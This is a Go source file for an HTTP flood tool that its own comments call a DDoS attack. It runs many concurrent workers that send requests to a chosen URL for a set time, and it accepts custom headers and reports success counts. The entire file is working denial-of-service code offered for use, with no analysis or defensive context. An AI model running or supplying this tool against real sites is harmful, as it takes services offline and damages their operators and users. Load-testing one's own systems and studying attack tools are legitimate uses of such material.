package main

import (
    "encoding/json"
    "flag"
    "fmt"
    "github.com/valyala/fasthttp"
    "io/ioutil"
    "log"
    "net"
    "net/url"
    "runtime"
    "sync/atomic"
    "time"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
    req           *fasthttp.Request
    timeout       time.Duration
    client        *fasthttp.Client
    stop          *chan bool
    amountWorkers int

    // Statistic
    successRequest int64
    amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int, Headers map[string]string, Timeout time.Duration) (*DDoS, error) {
    if workers < 1 {
        return nil, fmt.Errorf("Amount of workers cannot be less 1")
    }
    u, err := url.Parse(URL)
    if err != nil || len(u.Host) == 0 {
        return nil, fmt.Errorf("Undefined host or error = %v", err)
    }

    req := fasthttp.AcquireRequest()
    req.SetRequestURI(URL)
    for k, v := range Headers {
        req.Header.Add(k, v)
    }

    client := &fasthttp.Client{
        MaxConnsPerHost:     19384,
        MaxIdleConnDuration: time.Duration(2) * time.Second,
        ReadTimeout:         time.Duration(4) * time.Second,
        WriteTimeout:        time.Duration(4) * time.Second,
        Dial: func(addr string) (net.Conn, error) {
            return fasthttp.DialTimeout(addr, time.Duration(2) * time.Second)
        },
    }

    s := make(chan bool)
    return &DDoS{
        req:           req,
        timeout:       Timeout,
        client:        client,
        stop:          &s,
        amountWorkers: workers,
    }, nil
}


// Run - run DDoS attack
func (d *DDoS) Run() {
    for i := 0; i < d.amountWorkers; i++ {
        go func(index int) {
            for {
                select {
                case <-(*d.stop):
                    log.Printf("index | %3d | exited", index)
                    return
                default:
                    err := d.client.DoTimeout(d.req, nil, d.timeout)
                    atomic.AddInt64(&d.amountRequests, 1)
                    // https://tonybai.com/2015/10/30/error-handling-in-go/
                    switch err {
                    case nil:
                        atomic.AddInt64(&d.successRequest, 1)
                    case fasthttp.ErrTimeout:
                        // timeout
                        log.Printf("index | %3d | client do timeout error | %s\n", index, err)
                        time.Sleep(time.Duration(5) * time.Second)       
                    case fasthttp.ErrDialTimeout:
                        // dialing to the given TCP address timed out
                        log.Printf("index | %3d | TCP dial timeout error  | %s\n", index, err)
                        time.Sleep(time.Duration(5) * time.Second)
                    default:
                        // no free connections available to host
                        log.Printf("index | %3d | other error | %s\n", index, err)
                        time.Sleep(time.Duration(5) * time.Second)
                    }
                }
                runtime.Gosched()
            }
        }(i+1)
    }
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
    for i := 0; i < d.amountWorkers; i++ {
        (*d.stop) <- true
    }
    close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
    return d.successRequest, d.amountRequests
}

func main() {

    workers := flag.Int("w", 100, "worker num")
    targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
    workTime := flag.Int("t", 1, "how many seconds attack keep")
    timeOutCnt := flag.Int("to", 1, "fasthttp do timeout")
    jsonConfig := flag.String("hc", "", "headers json congfig file path")
    flag.Parse()

    log.Println("start ~~~")
    log.Printf("worker  | %d\n", *workers)
    log.Printf("target  | %s", *targetUrl)
    log.Printf("keep    | %d Seconds\n", *workTime)
    log.Printf("timeout | %d Seconds\n", *timeOutCnt)

    headers := make(map[string]string)

    if len(*jsonConfig) > 0 {
        file, err := ioutil.ReadFile(*jsonConfig)
        if err != nil {
            log.Printf("File error: %v\n", err)
            panic(err)
        }
        json.Unmarshal(file, &headers)
        for k, v := range headers {
            log.Print(k, v)
        }
    }

    d, err := New(*targetUrl, *workers, headers, time.Duration(*timeOutCnt) * time.Second)
    if err != nil {
        panic(err)
    }
    d.Run()
    time.Sleep(time.Duration(*workTime) * time.Second)
    d.Stop()
    log.Println(d.Result())
    log.Println("DDoS attack finish")
}
